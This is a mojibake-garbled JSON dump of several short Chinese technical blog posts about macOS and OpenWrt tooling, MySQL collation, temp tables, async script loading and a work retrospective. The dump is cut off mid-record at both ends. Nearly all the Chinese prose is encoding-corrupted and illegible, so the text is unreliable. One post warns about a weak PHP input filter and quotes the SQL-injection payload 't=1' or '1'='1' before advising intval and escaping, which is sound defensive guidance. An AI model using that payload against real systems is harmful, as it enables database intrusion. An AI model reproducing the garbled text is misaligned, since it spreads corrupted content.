æƒ¯äº†winä¸‹ç›´æ¥é€‰ä¸­æ–‡ä»¶å³é”®å¯¹æ¯”ï¼Œ åœ¨macä¸‹æ‰¾äº†å¥½ä¹…ï¼Œè¦ä¹ˆè´µçš„è¦æ­»ï¼Œè¦ä¹ˆæ²¡æœ‰ï¼Œæ‰€ä»¥å†³å®šè‡ªå·±åˆ›å»ºä¸€ä¸ªã€‚\næ‰“å¼€ç³»ç»Ÿè‡ªå¸¦çš„ Automator åˆ›å»ºä¸€ä¸ªæœåŠ¡ å³ä¸Š â€œæœåŠ¡â€æ”¶åˆ°é€‰å®šçš„ æ”¹ä¸º æ–‡ä»¶è´§æ–‡ä»¶å¤¹ ï¼Œ ä½äºæ”¹ä¸ºFinder.app\nå·¦è¾¹é€‰ ä½¿ç”¨å·¥å…· åŒå‡»ä¸‹é¢çš„ è¿è¡ŒShell è„šæœ¬\nå³è¾¹ ä¼ é€è¾“å…¥ æ”¹ä¸º ä½œä¸ºè‡ªå˜é‡ï¼Œ ä¸‹é¢è¾“å…¥ /Applications/DiffMerge.app/Contents/MacOS/DiffMerge \u0026quot;$1\u0026quot; \u0026quot;$2\u0026quot;\nå‚è€ƒè‡ªå·±çš„DiffMergeçš„ä½ç½®\nå¥½äº†ï¼Œ ç°åœ¨å–ä¸ªåå­—å¹¶ä¿å­˜\né€‰ä¸­è¦å¯¹æ¯”çš„æ–‡ä»¶ï¼Œ å³é”® -ã€‹æœåŠ¡ å°±å¯ä»¥çœ‹åˆ°äº†ã€‚\n","date":"2012-12-01T00:00:00Z","permalink":"https://hitian.info/post/diffmerge/","title":"ä¸ºDiffMergeåˆ›å»ºfinderå³é”®èœå•"},{"content":"å®‰è£…\nbrew update \u0026amp;\u0026amp; brew install dnsmasq\né…ç½®\n#ä»æ¨¡æ¿åˆ›å»ºé…ç½®æ–‡ä»¶\ncp /usr/local/Cellar/dnsmasq/2.63/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf\n#å¼€æœºè‡ªå¯åŠ¨\nsudo cp /usr/local/Cellar/dnsmasq/2.63/homebrew.mxcl.dnsmasq.plist /Library/LaunchDaemons/\nsudo launchctl load -w /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plistÂ ç¼–è¾‘ /usr/local/etc/dnsmasq.conf\nä¿®æ”¹Â resolv-file=/etc/resolv.dnsmasq.conf\nå¦‚æœåªæƒ³æœ¬æœºä½¿ç”¨ è¿™é‡Œä¹Ÿä¿®æ”¹ä¸€ä¸‹\nlisten-address=127.0.0.1\nä¿®æ”¹maxosçš„é…ç½®ä½¿ç”¨æœ¬åœ°çš„dnsmasq\nç¼–è¾‘Â /etc/resolv.conf\nä¿®æ”¹ nameserver 127.0.0.1\nå‚è€ƒåŸå§‹é¡µé¢Â http://blog.philippklaus.de/2012/02/install-dnsmasq-locally-on-mac-os-x-via-homebrew/\n","date":"2012-11-25T00:00:00Z","permalink":"https://hitian.info/post/macos-install-dnsmasq/","title":"macä¸‹å®‰è£…dnsmasqç¬”è®°"},{"content":"æƒ³ä½¿ç”¨v2exçš„dnsæ¥åŠ é€Ÿapp storeï¼Œ åˆä¸æƒ³å› ä¸ºdnsçš„åŸå› å¯¼è‡´æŸäº›ç½‘ç«™çš„åŒºåŸŸæ€§cdnåŠ é€Ÿå¤±æ•ˆ\nå…¶å®ç”¨dnsmasqå¾ˆå®¹æ˜“è§£å†³è¿™ä¸ªé—®é¢˜\nç»™è·¯ç”±å™¨åˆ·ä¸ªopenwrtï¼Œ ç„¶åè®¾ç½®å°±ç®€å•å¤šäº†\næ‰“å¼€ ç½‘ç»œ =ã€‹ DHCP/DNS é¡µé¢\nè®¾ç½®ä¸€ä¸‹é‡Œé¢çš„DNSè½¬å‘ï¼Œ æŠŠv2exçš„ä¸¤ä¸ªipåŠ è¿›å», å°†è‹¹æœçš„äºŒçº§åŸŸåä½¿ç”¨v2exè¿›è¡Œè§£æï¼Œ è€Œå…¶ä»–åŸŸåè¿˜æ˜¯é€šè¿‡æœ¬åœ°ispçš„dnsè§£æã€‚\n/.apple.com/199.91.73.222\n/.apple.com/178.79.131.110\nä¿å­˜ï¼Œ å¤§åŠŸå‘Šæˆ\n","date":"2012-11-25T00:00:00Z","permalink":"https://hitian.info/post/openwrt-dns-configuration/","title":"openwrt dnsé…ç½®"},{"content":" WinMerge\nå®˜ç½‘ï¼šhttp://winmerge.org/\nä¸€æ¬¾ Windows ä¸‹çš„å¼€æºå…è´¹æ–‡ä»¶æ¯”è¾ƒ/åˆå¹¶å·¥å…·ï¼Œæ”¯æŒæ–‡ä»¶/æ–‡ä»¶å¤¹æ¯”è¾ƒï¼Œå¯ä»¥å¤„ç†DOSã€UNIX å’Œ MAC ä¸­çš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ”¯æŒ Unicode æ ‡å‡†ä¸‡å›½ç ï¼Œå¯ä»¥å¯¹æ–‡æœ¬æ–‡æ¡£çš„å¯è§†åŒ–ç¼–è¾‘ä»¥åŠåˆå¹¶ï¼Œä¹Ÿæœ‰è¯­æ³•é«˜äº®å’Œæ”¯æŒå‹ç¼©åŒ…åŠŸèƒ½ï¼ˆé€šè¿‡7-Zipæ”¯æŒï¼‰ã€‚\nä¹‹å‰æ–‡ä»¶å¯¹æ¯”ä¸€ç›´ç”¨çš„TortoiseSVNè‡ªå¸¦çš„diff,Â ä¸è¿‡ä¸æ˜¯å¾ˆç›´è§‚, WinMerge ç”¨èµ·æ¥æ›´æ–¹ä¾¿ä¸€ç‚¹, å¯ä»¥ç›´æ¥æ˜¾ç¤ºä¸åŒçš„ä½ç½®, å¯ä»¥ç›´æ¥æ›¿æ¢æ‰TortoiseSVNé‡Œçš„. ","date":"2012-10-12T00:00:00Z","permalink":"https://hitian.info/post/winmerge/","title":"æ¨èä¸ªwinä¸‹é¢å¥½ç”¨çš„æ–‡ä»¶å¯¹æ¯”è½¯ä»¶WinMerge"},{"content":"åœ¨macä¸Šä½¿ç”¨sshä»£ç†å…¶å®å¾ˆæ–¹ä¾¿\nå‰ææ˜¯æœ‰ä¸€ä¸ªsshè´¦å·\nå‘½ä»¤\n$ ssh -D 1089 tian@domain.com\nä¼šæ‰“å¼€ç«¯å£1089 ç›‘å¬\næŸ¥çœ‹ç«¯å£å¯ä»¥å‘ç°\nActive Internet connections (including servers) Proto Recv-Q Send-Q Local Address Foreign Address (state) tcp6 0 0 ::1.1089 *.* LISTEN tcp4 0 0 127.0.0.1.1089 *.* LISTEN è¿™æ ·è¿æ¥å°±å»ºç«‹å¥½äº†ï¼Œ ç„¶åé…ç½®ä¸€ä¸‹\nè¿›å…¥ç½‘ç»œåå¥½è®¾ç½®ï¼Œ é€‰è‡ªå·±æ­£åœ¨ç”¨çš„ç½‘ç»œè¿æ¥ -ã€‹ç‚¹é«˜çº§-ã€‹é€‰æ‹©ä»£ç†æ ‡ç­¾\nä½¿ç”¨socksä»£ç†ï¼Œ å¡«ä¸Šåˆšæ‰çš„ç«¯å£å·\nç¡®å®éå¸¸æ–¹ä¾¿ã€‚\n","date":"2012-10-01T00:00:00Z","permalink":"https://hitian.info/post/macos-simple-proxy/","title":"macä¸Šæœ€ç®€å•çš„ä»£ç†æ–¹å¼"},{"content":"è¿‘å‡ å¤©åšå®¢çš„åƒåœ¾è¯„è®ºè¶Šæ¥è¶Šå¤šï¼Œ ä¸€å¤©ç”šè‡³å¥½å‡ åä¸ªã€‚ è¿«ä¸å¾—å·²è£…ä¸ªæ’ä»¶æ¥é˜²åƒåœ¾ã€‚\nç”±äºç©ºé—´ç¦ç”¨äº†php çš„fsockopen å‡½æ•°å¯¼è‡´Akismet æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨ã€‚\næµ‹è¯•ä¸€ä¸‹å‘ç°pfsockopen æ²¡æœ‰è¢«ç¦ç”¨ï¼Œ è¿›å…¥akismetçš„ç›®å½•æ‰¹é‡æ›¿æ¢æ‰€æœ‰fsockopenä¸ºpfsockopenã€‚\nç„¶åå°±æ£€æµ‹æ­£å¸¸äº†\nå…·ä½“çš„åŠŸèƒ½å¥½ä¸å¥½ä½¿å¾—è§‚å¯Ÿä¸€æ®µæ—¶é—´å†çœ‹äº†ã€‚\n","date":"2012-09-10T00:00:00Z","permalink":"https://hitian.info/post/blog-comments/","title":"blogè¯„è®ºååƒåœ¾"},{"content":"å‰å‡ å¤©å‘ç°çš„æ•°æ®åº“æ³¨å…¥æ€»ç»“ä¸€ä¸‹\nå‘ç”Ÿé—®é¢˜çš„è¿‡æ»¤:\n\u0026lt;?php $type = ( in_array($_GET[\u0026#39;t\u0026#39;],array(1,2,3)) )?$_GET[\u0026#39;t\u0026#39;]:0; è¿™ä¸ªè¿‡æ»¤å®é™…ä¸ä¸¥æ ¼, å½“ä¼ è¿›æ¥çš„å˜é‡ä»¥ 1,2,3ä¸­çš„ä»»æ„æ•°å­—å¼€å¤´æ—¶è¿‡æ»¤å°†å¤±è´¥\nå½“ç”¨æˆ· ä¼  t=1' or '1'='1 æ—¶, $typeè·å–åˆ°çš„å˜é‡å°†ç»´æŒåŸæ ·, ç›´æ¥ä¼ åˆ°æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢æ—¶ä¼šæœ‰æ³¨å…¥å±é™©\næ€»ç»“å’Œå»ºè®®:æ‰€æœ‰ç”±ç”¨æˆ·ä¼ å…¥int å€¼ å¿…é¡»ä½¿ç”¨ intval() è¿›è¡Œè¿‡æ»¤\nå­—ç¬¦ä¸²å¿…é¡»ä½¿ç”¨mysql_real_escape_string() è¿›è¡Œè¿‡æ»¤\nåœ¨è¯»å– $_GET $_REQUEST $_POST $_COOKIE æ—¶ å¿…é¡»è¿›è¡Œè¿‡æ»¤, ä¸€èˆ¬è®¤ä¸ºç”¨æˆ·ä¼ å…¥çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„.\n","date":"2012-04-29T00:00:00Z","permalink":"https://hitian.info/post/sql-injection-risk/","title":"æ³¨å…¥é£é™©æé†’"},{"content":"ä¸€èˆ¬æ•°æ®åº“ä¼šæ ¹æ®ä½¿ç”¨çš„æƒ…å†µæ¥è®¾è®¡, ä¸ºäº†ä¿è¯æ€§èƒ½ä¸€èˆ¬é“¾æ¥çš„è¡¨ä¸åº”è¯¥è¶…è¿‡2ä¸ª,\nä½†æ˜¯åœ¨æ•°æ®ç»Ÿè®¡æ±‡æ€»è¿ç®—çš„æ—¶å€™å°±éº»çƒ¦äº†, å¾€å¾€éœ€è¦æŸ¥å¥½å¤šå¼ è¡¨æ‰èƒ½å¾—åˆ°éœ€è¦çš„æ•°æ®.\nå¦‚æœæŸ¥è¯¢å¾ˆå¤æ‚çš„æ—¶å€™ä¸€æ¬¡joinå¥½å¤šå¼ è¡¨ä¼šå¯¼è‡´æŸ¥è¯¢é€Ÿåº¦å·¨æ…¢.\nå½“ç„¶ç”¨phpç­‰åŠ¨æ€è¯­è¨€æŠŠæ•°æ®å–å‡ºæ¥è¿›è¡Œè¿ç®—ä¹Ÿä¸é”™,å°±æ˜¯éœ€è¦å†™ä»£ç .\nèƒ½åœ¨æ•°æ®åº“å†…å®Œæˆçš„è¿ç®— å½“ç„¶æƒ³è¦ç›´æ¥åœ¨åº“å†…å®Œæˆ\nä½¿ç”¨ä¸´æ—¶è¡¨å­˜å‚¨è®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸­é—´æ•°æ®æ—¶éš”ä¸é”™çš„é€‰æ‹©\nä½¿ç”¨ä¸´æ—¶è¡¨è¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼Œ é¿å…å‡ºç°è¶…è¿‡3ä¸ªä»¥ä¸Šçš„joinæ“ä½œ\n\u0026ndash;ä»¥é˜²ä¸‡ä¸€å…ˆåˆ é™¤è¡¨\ndrop table if exists tmp_table;\n\u0026ndash;åˆ›å»ºä¸´æ—¶è¡¨çš„æ—¶å€™åŠ ä¸Štemporary å…³é”®å­—å°±è¡Œäº†\ncreate temporary table tmp_table(uid bigint not null primary key, cityid int(10) unsigned, prov varchar(50), city varchar(50), group_id tinyint );\n\u0026ndash;æŠŠå¤šä¸ªè¡¨ä¸­éœ€è¦çš„æ•°æ®ç»„åˆåœ¨ä¸€èµ·æ’å…¥ä¸´æ—¶è¡¨ä¸­, æš‚æ—¶æ²¡æœ‰çš„æ•°æ®æ’å…¥ç©ºå­—ç¬¦ä¸²\ninsert into tmp_table select a.uid as uid, a.cityid as cityid,'','',0 from my_city a inner join my_op b on a.uid=b.uid where a.reg_date='2012-04-10' and b.ctime\u0026gt;0;\n\u0026ndash;è”åˆå¤šè¡¨æ›´æ–°\nupdate tmp_table a, my_city bÂ set a.prov=b.prov, a.city=b.area where a.cityid=b.id;\n\u0026ndash;è¿˜æ˜¯è”åˆå¤šè¡¨æ›´æ–°\nupdate tmp_table a, my_city_auth bÂ set a.group_id=b.group_id where a.prov=b.prov;\n\u0026ndash;å‰©ä¸‹çš„å°±åªæ˜¯æŠŠç®—å¥½çš„æ•°æ®è¯»å‡ºæ¥äº†.\nè€Œä¸”ä¸´æ—¶è¡¨æ˜¯sessionçº§åˆ«çš„, åªæœ‰å½“å‰ç”¨æˆ·å¯è§, è€Œä¸”æ–­å¼€é“¾æ¥åå°±è‡ªåŠ¨æ¸…ç†äº†.\n","date":"2012-04-12T00:00:00Z","permalink":"https://hitian.info/post/sql-note/","title":"sqlç¬”è®°"},{"content":"mysql æ˜¯ä»4.0 å‡çº§ä¸Šæ¥çš„ï¼Œ ç›´æ¥ä½¿ç”¨äº†latin1_swedish_ci å­˜å‚¨æ±‰å­—ï¼Œæ²¡æƒ³åˆ°å¸¦æ¥äº†å¥½å¤šéº»çƒ¦ã€‚\né¦–å…ˆæ˜¯æŸ¥è¯¢çš„é—®é¢˜\nmysql\u0026gt; select * from my_city where city=â€™æ¸©å·â€™; +â€”-+â€”â€”+ | id | city | +â€”-+â€”â€”+ | 2 | æ¸©å· | | 3 | æ¢§å· | +â€”-+â€”â€”+ 2 rows in set (0.00 sec) å½“ç„¶, å¦‚æœåœ¨cityä¸Šå»ºäº†å”¯ä¸€ç´¢å¼•, å°±ä¼šå€’å¤§éœ‰\u0026hellip;\nç„¶åæ˜¯æ’åºçš„é—®é¢˜\nmysql\u0026gt; select * from my_city order by city asc; +â€”-+â€”â€”+ | id | city | +â€”-+â€”â€”+ | 6 | ä¸Šæµ· | | 2 | æ¸©å· | | 3 | æ¢§å· | | 5 | è¥¿å®‰ | | 7 | é‡åº† | | 4 | å®‰å¾½ | | 8 | åŒ—äº¬ | +â€”-+â€”â€”+ 7 rows in set (0.00 sec) è¿™ä¸ªé¡ºåºçœ‹èµ·æ¥æ›´è®©äººéƒé—·\u0026hellip;\nä¸´æ—¶è§£å†³æ–¹æ¡ˆ:\nALTER TABLEÂ `my_city` CHANGEÂ `city`Â `city` VARCHAR( 25 ) CHARACTER SET latin1 COLLATE latin1_bin NULL DEFAULT NULL\nä¿®æ”¹å­—æ®µçš„collate ä¸º latin1_bin\nç„¶åå†æ¥çœ‹\næŸ¥è¯¢æ­£å¸¸\nmysql\u0026gt; select * from my_city where city=â€™æ¸©å·â€™; +â€”-+â€”â€”+ | id | city | +â€”-+â€”â€”+ | 2 | æ¸©å· | +â€”-+â€”â€”+ 1 row in set (0.00 sec) æ’åºéƒ¨åˆ†æ­£å¸¸\nmysql\u0026gt; select * from my_city order by city asc; +â€”-+â€”â€”+ | id | city | +â€”-+â€”â€”+ | 4 | å®‰å¾½ | | 8 | åŒ—äº¬ | | 6 | ä¸Šæµ· | | 2 | æ¸©å· | | 3 | æ¢§å· | | 5 | è¥¿å®‰ | | 7 | é‡åº† | +â€”-+â€”â€”+ 7 rows in set (0.00 sec) è¦å½»åº•è§£å†³è¿˜æ˜¯è¦æ•´ä¸ªè½¬æ¢ä¸ºgbk ,Â å½“ç„¶utf-8 ä¼šæ›´å¥½ä¸€ç‚¹.\n","date":"2012-04-12T00:00:00Z","permalink":"https://hitian.info/post/latin1/","title":"ç”¨latin1æ¥å­˜å‚¨æ±‰å­—çœŸæŠ“ç‹‚"},{"content":"å½“ä¸€ä¸ªç½‘é¡µåŒ…å«å¤§é‡çš„å†…å®¹, è€Œåªæœ‰å…¶ä¸­çš„ä¸€å°éƒ¨åˆ†éœ€è¦æ˜¯åŠ¨æ€å†…å®¹(æ˜¾ç¤ºç”¨æˆ·å, ç§¯åˆ†ç­‰)æ—¶, é€šå¸¸æ•´ä¸ªé¡µé¢é‡‡ç”¨htmlé™æ€é¡µé¢, å¹¶ä½¿ç”¨jsæ¥åŠ è½½å’Œæ”¹å˜åŠ¨æ€çš„éƒ¨åˆ†.\nä½†æ˜¯åƒè¿™æ ·, å¦‚æœjsåŠ è½½é€Ÿåº¦å¾ˆæ…¢çš„è¯, ä¼šå¯¼è‡´ä¹‹ä¸‹çš„é¡µé¢åœæ­¢æ¸²æŸ“\u0026hellip;\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;demo6-1\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;content...\u0026lt;/p\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;get_something_api.php\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;p\u0026gt;content...\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; äºæ˜¯æˆ‘ä»¬å°†jså†™åœ¨é¡µé¢ä¸‹é¢, ç­‰é¡µé¢æ¸²æŸ“çš„å·®ä¸å¤šäº†å†åŠ è½½å®ƒ\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;demo6-1\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;content...\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;content...\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;demo6.html\u0026#34;\u0026gt;demo6.html\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;demo6-2.html\u0026#34;\u0026gt;demo6-2.html\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;demo6-3.html\u0026#34;\u0026gt;demo6-3.html\u0026lt;/a\u0026gt; \u0026lt;img src=\u0026#34;27218b6e.jpg\u0026#34; width=\u0026#34;1920\u0026#34; height=\u0026#34;1200\u0026#34; border=\u0026#34;0\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;get_something_api.php\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆ, ä½†æ˜¯æ–°çš„é—®é¢˜å‡ºç°äº†.\nå½“ç”±äºç½‘ç»œæˆ–è€…ç¨‹åºæ‰§è¡Œæ•ˆç‡çš„é—®é¢˜jsçš„é€Ÿåº¦å¾ˆæ…¢çš„æ—¶å€™, ç­‰å¾…jsåŠ è½½è¿‡ç¨‹ä¸­, é¡µé¢æ˜¯å¯ä»¥æ­£å¸¸æ“ä½œçš„, ä½†æ˜¯ä¸€æ—¦æ“ä½œæœ‰åŒä¸€æœåŠ¡å™¨ä¸Šä¸åŒèµ„æºçš„è¯·æ±‚æ—¶, è¿™ä¸ªè¯·æ±‚å°±å®Œå…¨å¡ä½äº†, ä¾‹å¦‚ç‚¹å‡»é¡µé¢ä¸Šçš„é“¾æ¥.Â åŒä¸€æœåŠ¡å™¨ä¸‹èµ„æºå¹¶ä¸èƒ½å¾ˆå¥½çš„å¤šçº¿ç¨‹åŒæ—¶è¯·æ±‚.\næœ¬åœ°ç”¨sleepæ¨¡æ‹Ÿä¸€ä¸ªéœ€è¦é•¿æ—¶é—´æ‰èƒ½å®Œæˆçš„å“åº”.\n\u0026lt;?php //do something and need some times header(\u0026#39;Content-Type:application/x-javascript\u0026#39;); sleep(5); echo \u0026#34;alert(\u0026#39;results\u0026#39;);\u0026#34;; ?\u0026gt; åœ¨å¯¹get_something_api.php çš„è¯·æ±‚è¿‡ç¨‹ä¸­, ç‚¹å‡»é¡µé¢å†…åŒåŸŸåä¸‹çš„é“¾æ¥, è€Œè·³è½¬åœ¨jsåŠ è½½å®Œæˆåæ‰ä¼šæ‰§è¡Œ. ä¸€èˆ¬è¾“å‡ºjså¯èƒ½ä¸ä¼šæ‰§è¡Œå¤ªä¹…, ä½†æ˜¯å½“ä½¿ç”¨é•¿è¿æ¥è¿›è¡Œä¸€äº›é¡µé¢ä¿¡æ¯çš„å®æ—¶æ¨é€æ—¶, è¿™ä¸ªé—®é¢˜ä¼šå¾ˆå¤§.\nè§£å†³æ–¹æ¡ˆå°±æ˜¯å°†get_something_api.php æ”¾åˆ°ä¸åŒçš„åŸŸåä¸‹å», å³ä½¿ä¸¤ä¸ªåŸŸåæŒ‡çš„æ˜¯åŒä¸€ä¸ªè™šæ‹Ÿä¸»æœº, ä¹Ÿå¯ä»¥è®©èµ„æºå¹¶è¡Œçš„åŠ è½½.\n","date":"2012-02-09T00:00:00Z","permalink":"https://hitian.info/post/a-little-things-about-asynchronous/","title":"å…³äºå¼‚æ­¥çš„ä¸€ç‚¹ç‚¹å…¶ä»–ä¸œè¥¿"},{"content":"2010å¹´11æœˆ15æ—¥æ¥ä¸Šæµ·çš„,Â å·²ç»ä¸€å¹´å¤šäº†, åœ¨è¿™ä¸€å¹´å¿™ç¢Œçš„å·¥ä½œä¸­æˆé•¿äº†ä¸å°‘ï¼Œå¾—åˆ°äº†å¾ˆå¤š, ä¹Ÿå¤±å»äº†å¾ˆå¤šã€‚ è¿™ä¸€å¹´ä¸­ï¼Œå·¥ä½œä¸Šå€’æ˜¯å‚ä¸äº†ä¸å°‘é¡¹ç›®çš„å¼€å‘ï¼Œå­¦ä¹ åˆ°äº†å¾ˆå¤š, ç„¶åå°±æ˜¯è¿™ç§å„æ ·çš„æ— å¥ˆ.\n1.é¦–é¡µä¸ªæ€§è®¾ç½®çš„å‰ç«¯å¼€å‘ï¼š è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨jså¼€å‘äº†ä¸€ä¸ªè¾ƒå¤æ‚çš„å®Œæ•´åŠŸèƒ½æ¨¡å—ï¼Œ ä¹Ÿæ˜¯è¿›å…¬å¸ä¹‹åå®Œæˆçš„ç¬¬äºŒä¸ªæ¯”è¾ƒå¤§çš„é¡¹ç›®ï¼Œå¼€å‘å’Œæµ‹è¯•ä¿®æ”¹å†æ—¶ä¸€ä¸ªå¤šæœˆï¼Œç”±äºä¸ç†Ÿæ‚‰å¼€å‘æµç¨‹ï¼Œ éœ€æ±‚ä¸€å†æ›´æ”¹ï¼Œå¼€å‘å‘¨æœŸä¹Ÿè¢«è¿«å»¶é•¿ï¼Œ ç®—æ˜¯ä¸€ä¸ªæ•™è®­å§ã€‚ ä¸è¿‡jsåŠŸåŠ›å¤§å¹…å¢é•¿ï¼Œç‰¹åˆ«æ˜¯æµè§ˆå™¨å…¼å®¹æ€§å’Œæµè§ˆå™¨æœ¬åœ°å­˜å‚¨ç§¯ç´¯äº†ä¸å°‘å®ç”¨ç»éªŒã€‚\n2.ç§»åŠ¨å¯¼èˆªç¬¬äºŒç‰ˆçš„å‰å°å¼€å‘ï¼š ç”±äºæ˜¯ä¸€ä¸ªè§¦å±æ‰‹æœºç‰ˆçš„ç½‘ç«™ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å‰æ²¿çš„æŠ€æœ¯ï¼Œ è®©æˆ‘æœ‰å¹¸æ¥è§¦åˆ°äº†html5ï¼Œè¿˜æœ‰å¼ºå¤§çš„jquery-mobileæ¡†æ¶ã€‚æ¯•ç«Ÿæ˜¯æ–°æ¥è§¦çš„ä¸œè¥¿ï¼Œ ç”±äºå‰æœŸçš„æ¡†æ¶å­¦ä¹ å’Œå¯è¡Œæ€§åˆ†æä¸å¤Ÿå¯¼è‡´äº†å¼€å‘ä¸­é‡åˆ°äº†å¾ˆå¤šæ£˜æ‰‹çš„é—®é¢˜ï¼Œè®©æˆ‘å……åˆ†äº†è§£äº†æ–°æŠ€æœ¯åº”ç”¨å¯èƒ½ç»™é¡¹ç›®å¸¦æ¥çš„é£é™©ï¼Œä¸è¿‡è¿˜å¥½é¡¹ç›®é¡ºåˆ©å®Œå·¥å¹¶ä¸Šçº¿ã€‚\n3.ç½‘å€å¯¼èˆªé«˜çº§ç‰ˆå¼€å‘ï¼š å®Œæ•´å‚ä¸äº†å‰æœŸçš„éœ€æ±‚å’Œå¼€å‘å’Œç»´æŠ¤ï¼Œå¸å–å‰å‡ æ¬¡çš„æ•™è®­ï¼Œåœ¨é¡¹ç›®å‰æœŸåšäº†å¤§é‡çš„æŠ€æœ¯æµ‹è¯•ï¼Œ åŒ…æ‹¬éœ€è¦ç”¨åˆ°çš„jsæ‹–åŠ¨æ¡†æ¶ï¼Œ æœ¬åœ°å­˜å‚¨ï¼Œ ä»¥åŠç¼“å­˜æŠ€æœ¯ï¼Œ ä½†æ˜¯å¯¹å¼€å‘å‘¨æœŸçš„ç›²ç›®ä¹è§‚å¯¼è‡´åˆ°æœ€åä¸å¾—ä¸åŠ ç­åŠ ç‚¹æ‰èƒ½æŒ‰æ—¶å®Œæˆé¡¹ç›®ï¼Œè¿˜æœ‰æœªæ•´ç†è¯¦ç»†çš„å¼€å‘æ–‡æ¡£å¯¼è‡´åé¢çš„ç»´æŠ¤é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ã€‚è¿™ä¸ªé¡¹ç›®æ¶‰åŠä»å‰å°jsä¸€ç›´åˆ°åå°æ•°æ®åº“è®¾è®¡çš„ä¸€æ•´å¥—çš„ä¸œè¥¿ï¼Œç§¯ç´¯äº†å¾ˆå¤šç½‘ç«™æ€§èƒ½æ–¹é¢çš„çŸ¥è¯†ï¼Œä¹Ÿè®©æˆ‘æ˜ç™½äº†ç‰µå¤´åšä¸€ä¸ªé¡¹ç›®æœ‰å¤šä¹ˆä¸å®¹æ˜“ã€‚\n4.ç§¯åˆ†ç³»ç»Ÿç»´æŠ¤ï¼šååŠå¹´æ­£å¼å¼€å§‹ä¸“èŒç»´æŠ¤ç§¯åˆ†ç³»ç»Ÿï¼Œå¯¹æˆ‘æ¥è¯´è¿™æ˜¯ä¸€ä¸ªæ–°çš„æŒ‘æˆ˜ï¼Œä¹‹å‰ä»æ¥æ²¡æœ‰æ¥è§¦è¿‡è¿™ä¹ˆå¤§é‡çš„æ•°æ®éœ€è¦è¿ç®—ã€å­˜å‚¨ï¼Œéœ€è¦å…³å¿ƒçš„ä¸åªæ˜¯åŠŸèƒ½èƒ½ä¸èƒ½å®ç°ï¼Œæ•°æ®é‡å¤§äº†ä¹‹åï¼Œ æ€§èƒ½çš„é‡è¦æ€§è¶Šæ¥è¶Šçªå‡ºï¼Œå¯èƒ½åªæ˜¯å¾ˆå°çš„æ”¹åŠ¨éƒ½å¯ä»¥è®©è¿ç®—æ—¶é—´å¤§å¹…å‡å°ï¼Œå½“ç„¶ä¹Ÿå¿…é¡»éå¸¸å°å¿ƒï¼Œå› ä¸ºä»»ä½•çš„å°å¤±è¯¯éƒ½å¯èƒ½å¯¼è‡´ä¸¥é‡çš„é—®é¢˜ã€‚\næµæ°´å¸å†™å®Œäº†, ç„¶åå°±æ˜¯ä¸€äº›æ„Ÿå—å’Œåæ§½:\n1.æ¯•ç«Ÿæ˜¯ç¬¬ä¸€ä»½æ­£å¼çš„å·¥ä½œ, æˆ‘ä¸çŸ¥é“100å¤šäººçš„å…¬å¸ç®—å¤§è¿˜æ˜¯å°,Â ä¸è¿‡å¿«é€Ÿå‘å±•å¯¼è‡´ç®¡ç†è·Ÿä¸ä¸Šç¡®å®æ˜¯ä¸€ä»¶ä¸¥é‡çš„äº‹æƒ….\n2.é«˜å±‚çš„ç›®æ ‡æ˜¯å®ä¼Ÿçš„, ä¸­å±‚åªæƒ³å°½å¿«æœ‰ä¸šç»©, ä½œä¸ºåº•å±‚å‘˜å·¥å°±åªæ˜¯æ— å¥ˆ.\n3.æˆ‘ä»¬ç”¨ä¸€æˆä¸å˜çš„æŠ€æœ¯æ¥åº”å¯¹äº§å“ç­–åˆ’æ—¥ç›Šæ›´æ–°çš„éœ€æ±‚, è¿™æ ·çœŸä¼šæ­»äººçš„.\n4.åˆæœŸèµ¶è¿›åº¦å¯¼è‡´çš„è€ƒè™‘å’Œè®¾è®¡ä¸è¶³å°†åœ¨ä¸€æ®µæ—¶é—´åå¤§è§„æ¨¡æ‰©å¤§.\n5.å¦‚æœæ‰€æœ‰äº§å“ç­–åˆ’æœªç»ä»»ä½•å®¡æ ¸çš„æƒ³æ³•éƒ½æäº¤ç»™å¼€å‘äººå‘˜å¿…é¡»å®ç°, æ²¡æœ‰è§„åˆ’,æ²¡æœ‰é•¿è¿œçš„è€ƒè™‘, ç”šè‡³éš”å‡ å¤©å°±è¦æ”¹æ•°æ®ç»“æ„, æ”¹ä¸šåŠ¡é€»è¾‘, é‚£ä¹ˆç³»ç»Ÿå´©æºƒæ˜¯è¿Ÿæ—©çš„äº‹, è¿™ç»å¯¹ä¸æ˜¯å±è¨€è€¸å¬.\n6.å°çš„é€»è¾‘é”™è¯¯è‡ªå·±æ˜¯å¾ˆéš¾å‘ç°çš„, è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ä»£ç 